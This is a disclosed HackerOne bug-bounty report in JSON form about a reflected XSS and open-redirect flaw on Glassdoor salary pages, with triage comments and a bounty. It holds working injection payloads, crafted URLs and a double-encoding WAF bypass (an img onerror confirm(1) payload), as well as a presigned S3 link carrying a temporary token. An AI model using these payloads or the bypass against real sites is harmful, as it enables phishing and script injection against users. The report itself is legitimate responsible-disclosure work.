{"id":789689,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83ODk2ODk=","url":"https://hackerone.com/reports/789689","title":"XSS at https://www.glassdoor.com/Salary/* via filter.jobTitleExact","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2020-02-06T00:49:29.522Z","submitted_at":"2020-02-06T00:49:29.522Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"bendtheory","url":"/bendtheory","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/090/338/ae5c7ca6c132f4cdf326c4436691c4d56ba7ade4_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":204,"url":"https://hackerone.com/glassdoor","handle":"glassdoor","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/tenbgFGw2cedBhoeJciMDcYg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/tenbgFGw2cedBhoeJciMDcYg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Glassdoor","twitter_handle":"glassdoor","website":"http://www.glassdoor.com/","about":"Get Hired. Love Your Job."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2021-04-09T13:37:44.805Z","bug_reporter_agreed_on_going_public_at":"2020-12-08T17:56:07.113Z","team_member_agreed_on_going_public_at":"2021-04-09T13:37:44.654Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"**Summary:** \nThere exists a Cross Site Scripting and Content Injection vulnerability at https://www.glassdoor.com/Salary/* via the `filter.jobTitleExact` query parameter. Using URL encoded HTML entities, it is possible to inject HTML content and break out of the context of a \u003cmeta\u003e tag. \n\nThe WAF does a good job blocking most javascript payloads and appears to block parentheses, backticks, and document objects. If I do find a way to bypass the WAF and execute a javascript alert or similar, I will add a comment to this report. \n\nHowever, it is still possible to inject payloads to achieve content injection and open redirects. The following `\u003cmeta\u003e` tag redirect payload is not blocked by the WAF:\n\n```\n\"\u0026gt;\u0026lt;meta http-equiv=\"refresh\" content =\"0; url=//bit.ly\"\u0026gt;\n```\nAnd here's the final URL used:\n\nhttps://www.glassdoor.com/Salary/Bain-and-Company--and-gt-and-lt-meta-http-equiv-refresh-content-0-url-bit-ly-and-gt-India-Salaries-E3752_DAO.htm?filter.jobTitleExact=%22%26gt%3B%26lt%3Bmeta+http-equiv%3D%22refresh%22+content+%3D%220%3B+url%3D%2F%2Fbit.ly%22%26gt%3B\u0026selectedLocationString=N%2C115\n\nThe source of the page now looks like this:\n\n```html\n\u003cmeta name=\"description\" content=\"No salaries available for salaries Bain \u0026 Company in \"\u003e\u003cmeta http-equiv=\"refresh\" content=\"0; url=//bit.ly\"\u003e, but Glassdoor has India for similar job titles, locations or employers.\"/\u003e\n```\n...which will redirect you to https://bit.ly\n\nAffected URL or select Asset from In-Scope:\n\nhttps://www.glassdoor.com/Salary/Bain-and-Company--and-gt-and-lt-meta-http-equiv-refresh-content-0-url-bit-ly-and-gt-India-Salaries-E3752_DAO.htm\n\nAffected Parameter:\n\n`filter.jobTitleExact`\n\nBrowsers tested:\nFirefox and Chrome\n\n## Steps To Reproduce:\n\n  1. Click on the prepared URL: https://www.glassdoor.com/Salary/Bain-and-Company--and-gt-and-lt-meta-http-equiv-refresh-content-0-url-bit-ly-and-gt-India-Salaries-E3752_DAO.htm?filter.jobTitleExact=%22%26gt%3B%26lt%3Bmeta+http-equiv%3D%22refresh%22+content+%3D%220%3B+url%3D%2F%2Fbit.ly%22%26gt%3B\u0026selectedLocationString=N%2C115\n  2. You will be redirected to https://bit.ly\n\n##Impact Description: \nThis vulnerability could be used to facilitate phishing campaigns against Glassdoor users by redirecting to malicious sites. With additional research into bypassing the WAF, XSS payloads could steal sensitive cookies or steal credentials from users.\n\n## Impact\n\nThis vulnerability could be used to facilitate phishing campaigns against Glassdoor users by redirecting to malicious sites. With additional research into bypassing the WAF, XSS payloads could steal sensitive cookies or steal credentials from users.","bounty_amount":"900.0","formatted_bounty":"$900","weakness":{"id":60,"name":"Cross-site Scripting (XSS) - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":100,"voters":["monke","bigmac4life","pmnh","yssk","pretorian","alexandrio","mass0ma","bendtheory","battle_angel","run_win","and 90 more..."],"severity":{"rating":"medium","author_type":"Team"},"structured_scope":{"databaseId":8181,"asset_type":"URL","asset_identifier":"http://www.glassdoor.com/","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":6975138,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@bendtheory - thanks for the report. I did notice the redirection to `bit.ly`. I will bring this to the attention of our internal development team and keep you posted on any updates. Keep up the good work.","automated_response":false,"created_at":"2020-02-06T03:56:46.740Z","updated_at":"2020-02-06T03:56:46.740Z","actor":{"username":"jjone","cleared":false,"url":"/jjone","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"glassdoor","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6977641,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2020-02-06T10:43:26.079Z","updated_at":"2020-02-06T10:43:26.079Z","additional_data":{"old_severity":"Medium (5.0)","new_severity":"Low","old_severity_id":625828,"new_severity_id":626053},"actor":{"username":"turtle_shell","cleared":false,"url":"/turtle_shell","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/UEHxCfDVKTBNymNpNGb7qwy6/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"glassdoor","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":6977652,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hello @bendtheory,\n\nThank you for your submission! We were able to validate your report, and have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report, and when/if a fix will be implemented. Please note that the status and severity are subject to change.\n@bendtheory , I think that if you try some more payloads you can reach an XSS and we can upgrade the severity. Try this [cheatsheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) !\n\nRegards,\n@turtle_shell ","automated_response":false,"created_at":"2020-02-06T10:45:37.676Z","updated_at":"2020-02-06T10:45:37.676Z","actor":{"username":"turtle_shell","cleared":false,"url":"/turtle_shell","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/UEHxCfDVKTBNymNpNGb7qwy6/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"glassdoor","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":6982548,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Update: XSS is possible! Using the HTML entity encoding mentioned earlier, I double HTML encoded, then URL encoded the parentheses. For some weird reason, that actually worked!\n\n`confirm(1)` --\u003e `confirm%26amp%3B%23x00028%3B1%26amp%3B%23x00029%3B`\n\nhttps://www.glassdoor.com/Salary/Bain-and-Company--and-gt-and-lt-img-src-onerror-confirm-and-amp-x00028-1-and-amp-x00029-and-gt-India-Salaries-E3752_DAO.htm?filter.jobTitleExact=%22%26gt%3B%26lt%3Bimg+src+onerror%3Dconfirm%26amp%3B%23x00028%3B1%26amp%3B%23x00029%3B%26gt%3B\u0026selectedLocationString=N%2C115\n\nthe final payload, url decoded used is\n\n```\n\"\u0026gt;\u0026lt;img+src+onerror=confirm\u0026amp;#x00028;1\u0026amp;#x00029;\u0026gt;\n```\n\nthat was fun! :)\n\n{F708436}","automated_response":false,"created_at":"2020-02-06T22:50:32.232Z","updated_at":"2020-02-06T22:50:32.232Z","actor":{"username":"bendtheory","cleared":true,"url":"/bendtheory","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/090/338/ae5c7ca6c132f4cdf326c4436691c4d56ba7ade4_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":708436,"filename":"www_-_Salary_-_XSS.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/kN9UnacWU3jUJYZaKnguzP3R?response-content-disposition=attachment%3B%20filename%3D%22www_-_Salary_-_XSS.png%22%3B%20filename%2A%3DUTF-8%27%27www_-_Salary_-_XSS.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQTXACUYF6%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T152804Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQDZ4o5FgQbPOV7cUhasXsMpsRhfie%2BaT3j2%2FpT4vRtXrQIhANTpo%2FcLyZWkchHfmQUF52JZTNkTQv76yqIpKiufRkzIKoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgxBFvChFQcfy0iFfX8q1wNyqcNfKQ7lbPM93GK7zsCVuFEl%2FVm4iCcIyQUbJFWfH2jiZwLWzXyXOGtPdAFg6jZ27A3JiIMI2cRQ0ZjefpX23ew4f2EgNrAjI%2BtoD%2F5QRlfpZWkH6iJZQB6Tl2elKHpLsozAmLMg2ZCF27az6tPlE5SwA3JPC5KKlDjsViNs2UljZCi3H9uSwsukoU%2FvdCWTH%2Fn50kTwo3bwe%2FH3PWsruJkAQ7DX1%2Fj9brsxUqDkLoqtLrdoJjkKc0QIPiVbiif2roLjf%2B%2BMNUUjLjPZ27VJBWMgYN3p%2FXN%2Fc2BT1VqWpZMMYQ84FXmc9pAGYMt40reW%2BOqOJwy98WVa3ZnRts3MNHsi7yiH6arhodeoIERCyyc0BhhJEItkxN5Wzyg1DrlhRUS1Y71%2FbjrEz4uBhQSkdwrt3ERf6rlWOARG2SfQdqloTHaxYeaKlkA1gYk2lr8P8v4Z2wcf76dl0kv5neqxZuEP1QXm7QMG6m4bxy4%2BSeNKsdU%2FVA5yixjEwa92C8A1VyBQrxcJgjfs7VfF2qV2iBmnh%2FB2iQg07zl1YJd0cPNun9USqJb8Uqe%2B27IwrOZbWtmOWnBh1TcvDRMDsM%2FPcb7c4FlLVjUX8TDrhUH4Hz0mpfpQPYswtoqRiwY6pAGpulV8rT1rLL2zo7CLXj%2FCsA9YXTe8QLCuwj5BAVEq1XkBbMgCpFE7wCWHjGb7zRvhVV%2BN69FRCvvxudtZT7OkdQfTd7cCnr7vVLgwdFxyTBTiSFdPhCB%2F%2BGa%2FZGSO8Tzmn%2F5kYwNrvNcaCO%2FfxLRKT5QyWFtCeJZaDCV4pXJgLvMY0o61KPcMitqxyN7tABkO5sZ5lEaE04FUiiZgi%2BMqeSxyhg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=2f95bed1c610c6980bef642f20726c0bc6ff60f4dd535791b44e58f33f600131"}],"genius_execution_id":null,"team_handle":"glassdoor","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6982581,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@bendtheory - great work. Bumping it back to Medium. Thanks for your persistence.","automated_response":false,"created_at":"2020-02-06T22:57:50.947Z","updated_at":"2020-02-06T22:57:50.947Z","actor":{"username":"jjone","cleared":false,"url":"/jjone","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"glassdoor","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6982582,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2020-02-06T22:57:59.375Z","updated_at":"2020-02-06T22:57:59.375Z","additional_data":{"old_severity":"Low","new_severity":"Medium","old_severity_id":626053,"new_severity_id":626455},"actor":{"username":"jjone","cleared":false,"url":"/jjone","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"glassdoor","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7357236,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"@bendtheory - this has been resolved. please do let us know if you see any issues.","automated_response":false,"created_at":"2020-03-18T16:03:05.174Z","updated_at":"2020-03-18T16:03:05.174Z","actor":{"username":"jjone","cleared":false,"url":"/jjone","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"bendtheory","url":"/bendtheory"},"genius_execution_id":null,"team_handle":"glassdoor","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7357265,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"@bendtheory - thanks for your great work. Bonus for bypassing the WAF and getting a successful XSS. Looking forward to more good findings from you.","automated_response":false,"created_at":"2020-03-18T16:06:01.232Z","updated_at":"2020-03-18T16:06:01.232Z","actor":{"url":"/glassdoor","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/tenbgFGw2cedBhoeJciMDcYg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Glassdoor"}},"bounty_amount":"750.0","bounty_currency":"usd","bonus_amount":"150.0","genius_execution_id":null,"team_handle":"glassdoor","collaborator":{"username":"bendtheory","url":"/bendtheory"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":10043597,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"@jjone and @glassdoor, can we disclose this one?","automated_response":false,"created_at":"2020-12-08T17:56:07.140Z","updated_at":"2020-12-08T17:56:07.140Z","first_to_agree":true,"actor":{"username":"bendtheory","cleared":true,"url":"/bendtheory","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/090/338/ae5c7ca6c132f4cdf326c4436691c4d56ba7ade4_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"glassdoor","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":11326823,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Following up on this, @jjone and @glassdoor, can we disclose this report?","automated_response":false,"created_at":"2021-04-09T02:45:24.169Z","updated_at":"2021-04-09T02:45:24.169Z","actor":{"username":"bendtheory","cleared":true,"url":"/bendtheory","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/090/338/ae5c7ca6c132f4cdf326c4436691c4d56ba7ade4_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"glassdoor","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":11337063,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@bendtheory - sorry I missed the disclosure request. Yes, we can disclose it.","automated_response":false,"created_at":"2021-04-09T13:36:18.856Z","updated_at":"2021-04-09T13:36:18.856Z","actor":{"username":"jjone","cleared":false,"url":"/jjone","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"glassdoor","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":11337387,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2021-04-09T13:37:44.681Z","updated_at":"2021-04-09T13:37:44.681Z","actor":{"username":"jjone","cleared":false,"url":"/jjone","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"glassdoor","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":11337388,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2021-04-09T13:37:44.855Z","updated_at":"2021-04-09T13:37:44.855Z","actor":{"username":"jjone","cleared":false,"url":"/jjone","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"glassdoor","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}